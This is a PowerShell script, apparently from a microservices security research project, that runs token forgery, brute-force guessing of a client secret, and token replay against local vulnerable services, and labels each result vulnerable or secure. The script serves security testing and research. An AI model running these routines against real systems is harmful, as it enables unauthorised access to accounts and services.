# PowerShell Attack Scripts - Matching the research paper exactly
# Run these against the VULNERABLE services to replicate paper results

Write-Host "=== MICROSERVICES SECURITY ATTACK SCRIPTS (PowerShell) ===" -ForegroundColor Cyan
Write-Host ""

# ─────────────────────────────────────────────────────────────
# ATTACK 1: Token Forgery (using pre-generated token from fake.js)
# ─────────────────────────────────────────────────────────────
function Attack-TokenForgery {
    Write-Host "ATTACK 1: TOKEN FORGERY" -ForegroundColor Yellow
    Write-Host "Generating forged token via Node.js script..."

    # Generate forged token using the attacker script
    $token = node "$PSScriptRoot\attacker\attack1-token-forgery-gen.js" 2>$null
    if (-not $token) {
        Write-Host "[ERROR] Could not generate token. Is Node.js installed?" -ForegroundColor Red
        return
    }

    Write-Host "Forged token: $token"
    Write-Host "Sending to Order Service..."

    try {
        $response = Invoke-RestMethod `
            -Uri "http://localhost:4000/orders" `
            -Headers @{ Authorization = "Bearer $token" } `
            -Method GET
        Write-Host "[!] VULNERABLE - Orders received: $($response | ConvertTo-Json)" -ForegroundColor Red
    } catch {
        Write-Host "[+] SECURE - Token rejected: $($_.Exception.Response.StatusCode)" -ForegroundColor Green
    }
    Write-Host ""
}

# ─────────────────────────────────────────────────────────────
# ATTACK 2: Brute Force (exact script from paper)
# ─────────────────────────────────────────────────────────────
function Attack-BruteForce {
    Write-Host "ATTACK 2: BRUTE-FORCE CREDENTIAL ATTACK" -ForegroundColor Yellow

    $secrets = @(
        "123456",
        "admin",
        "password",
        "test",
        "order_secret"
    )

    foreach ($s in $secrets) {
        try {
            $result = Invoke-RestMethod `
                -Uri "http://localhost:3000/service-token" `
                -Headers @{
                    "x-client-id"     = "order_service"
                    "x-client-secret" = $s
                } `
                -Method POST
            Write-Host "[!] FOUND SECRET: $s" -ForegroundColor Red
            Write-Host "    Token: $($result.token)"
            break
        } catch {
            $statusCode = $_.Exception.Response.StatusCode
            if ($statusCode -eq "TooManyRequests") {
                Write-Host "[+] BLOCKED by rate limiting after attempt: $s" -ForegroundColor Green
                Write-Host "[RESULT] SECURE: Rate limiting is working" -ForegroundColor Green
                break
            } else {
                Write-Host "    FAILED: $s ($statusCode)"
            }
        }
    }
    Write-Host ""
}

# ─────────────────────────────────────────────────────────────
# ATTACK 3: Replay Attack (exact script from paper)
# ─────────────────────────────────────────────────────────────
function Attack-Replay {
    param([string]$Token)

    Write-Host "ATTACK 3: REPLAY ATTACK" -ForegroundColor Yellow

    if (-not $Token) {
        Write-Host "[ERROR] Provide a captured token: Attack-Replay -Token '<jwt>'" -ForegroundColor Red
        return
    }

    Write-Host "Replaying captured token 5 times..."
    for ($i = 1; $i -le 5; $i++) {
        try {
            $result = Invoke-RestMethod `
                -Uri "http://localhost:4000/orders" `
                -Headers @{ Authorization = "Bearer $Token" } `
                -Method GET
            Write-Host "  [!] Attempt $i: ACCEPTED (VULNERABLE)" -ForegroundColor Red
        } catch {
            $statusCode = $_.Exception.Response.StatusCode
            Write-Host "  [+] Attempt ${i}: BLOCKED - $statusCode (SECURE)" -ForegroundColor Green
        }
        Start-Sleep -Milliseconds 300
    }
    Write-Host ""
}

# ─────────────────────────────────────────────────────────────
# Helper: Get a valid token from auth service
# ─────────────────────────────────────────────────────────────
function Get-ServiceToken {
    param(
        [string]$Secret = "order_secret"
    )
    try {
        $result = Invoke-RestMethod `
            -Uri "http://localhost:3000/service-token" `
            -Headers @{
                "x-client-id"     = "order_service"
                "x-client-secret" = $Secret
            } `
            -Method POST
        return $result.token
    } catch {
        Write-Host "[ERROR] Could not get token: $($_.Exception.Message)" -ForegroundColor Red
        return $null
    }
}

# ─────────────────────────────────────────────────────────────
# Run all attacks
# ─────────────────────────────────────────────────────────────
function Run-AllAttacks {
    Attack-TokenForgery
    Attack-BruteForce

    $token = Get-ServiceToken
    if ($token) {
        Attack-Replay -Token $token
    }

    Write-Host "=== All attack demonstrations complete ===" -ForegroundColor Cyan
}

Write-Host "Available functions:" -ForegroundColor Cyan
Write-Host "  Attack-TokenForgery  - Demonstrate token forgery"
Write-Host "  Attack-BruteForce    - Automated credential guessing"
Write-Host "  Attack-Replay        - Token replay attack"
Write-Host "  Get-ServiceToken     - Get a valid token from auth service"
Write-Host "  Run-AllAttacks       - Run all demonstrations"
Write-Host ""
Write-Host "Usage: . .\attacks.ps1 ; Run-AllAttacks"
